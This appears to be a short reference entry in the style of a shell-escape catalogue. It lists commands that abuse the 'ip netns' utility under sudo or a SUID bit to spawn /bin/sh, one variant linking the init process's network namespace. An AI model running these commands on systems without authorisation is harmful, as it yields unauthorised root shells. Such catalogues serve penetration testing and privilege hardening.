Shell
-----

[Sudo]
    ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo

[SUID]
    ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo

[Sudo]
    ip netns add foo
ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
ip netns exec bar /bin/sh
ip netns delete foo
ip netns delete bar
